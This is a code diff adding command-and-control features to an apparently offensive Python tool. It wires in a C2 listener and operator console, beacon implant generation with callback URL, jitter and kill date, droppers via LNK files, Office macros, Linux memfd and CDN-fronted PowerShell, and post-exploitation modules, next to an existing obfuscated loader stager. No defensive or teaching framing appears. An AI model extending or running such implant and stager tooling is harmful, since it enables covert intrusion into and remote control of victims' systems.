@@ -184,6 +184,29 @@ def main():
     loader_parser.add_argument("--obfuscate", action="store_true", help="Base64-encode PS output")
     loader_parser.add_argument("--out", help="Output file", required=True)
 
+    # ── C2 Commands ──────────────────────────────────────────────
+    c2_server_parser = subparsers.add_parser("c2-server", help="Start the C2 HTTP listener")
+    c2_server_parser.add_argument("--host", default="0.0.0.0")
+    c2_server_parser.add_argument("--port", type=int, default=8443)
+
+    subparsers.add_parser("c2-console", help="Launch the interactive C2 operator console")
+
+    c2_beacon_parser = subparsers.add_parser("c2-beacon", help="Generate a beacon implant")
+    c2_beacon_parser.add_argument("--url", required=True, help="C2 callback URL")
+    c2_beacon_parser.add_argument("--lang", choices=["python", "powershell"], default="python")
+    c2_beacon_parser.add_argument("--sleep", type=int, default=5, help="Sleep interval (seconds)")
+    c2_beacon_parser.add_argument("--jitter", type=int, default=20, help="Jitter percentage")
+    c2_beacon_parser.add_argument("--kill-date", help="Kill date (YYYY-MM-DD)")
+    c2_beacon_parser.add_argument("--out", required=True, help="Output file")
+
+    c2_stage_parser = subparsers.add_parser("c2-stage", help="Generate a staged payload recipe")
+    c2_stage_parser.add_argument("--recipe", choices=["windows_full", "lnk_dropper", "office_macro", "linux_memfd", "fronted_ps"], required=True)
+    c2_stage_parser.add_argument("--url", required=True, help="Beacon/payload URL")
+    c2_stage_parser.add_argument("--front", help="CDN front host (for fronted_ps)")
+    c2_stage_parser.add_argument("--path", default="/", help="URL path (for fronted_ps)")
+
+    subparsers.add_parser("c2-modules", help="List available post-exploitation modules")
+
     args = parser.parse_args()
 
     if not args.command:
@@ -624,6 +647,53 @@ def main():
             with open(args.out, "w") as f:
                 f.write(result)
             print(f"Successfully generated loader stager: {args.out}")
+
+        elif args.command == "c2-server":
+            from c2.server import start_c2
+            start_c2(host=args.host, port=args.port)
+
+        elif args.command == "c2-console":
+            from c2.console import C2Console
+            C2Console().start()
+
+        elif args.command == "c2-beacon":
+            from c2.beacon_gen import BeaconGen
+            code = BeaconGen.generate(
+                args.url,
+                lang=args.lang,
+                sleep_sec=args.sleep,
+                jitter_pct=args.jitter,
+                kill_date=getattr(args, 'kill_date', None),
+            )
+            with open(args.out, 'w') as f:
+                f.write(code)
+            print(f"Successfully generated {args.lang} beacon: {args.out}")
+
+        elif args.command == "c2-stage":
+            from c2.stager import Stager
+            recipe = args.recipe
+            if recipe == "windows_full":
+                path = Stager.windows_full(args.url)
+            elif recipe == "lnk_dropper":
+                path = Stager.lnk_dropper(args.url)
+            elif recipe == "office_macro":
+                path = Stager.office_macro(args.url)
+            elif recipe == "linux_memfd":
+                path = Stager.linux_memfd(args.url)
+            elif recipe == "fronted_ps":
+                if not args.front:
+                    print("Error: --front required for fronted_ps recipe")
+                    sys.exit(1)
+                path = Stager.fronted_ps(args.url, args.front, args.path)
+            else:
+                print(f"Unknown recipe: {recipe}")
+                sys.exit(1)
+            print(f"Successfully staged payload: {path}")
+
+        elif args.command == "c2-modules":
+            import modules
+            modules.discover()
+            print(modules.list_modules())
 
         else:
             parser.print_help()
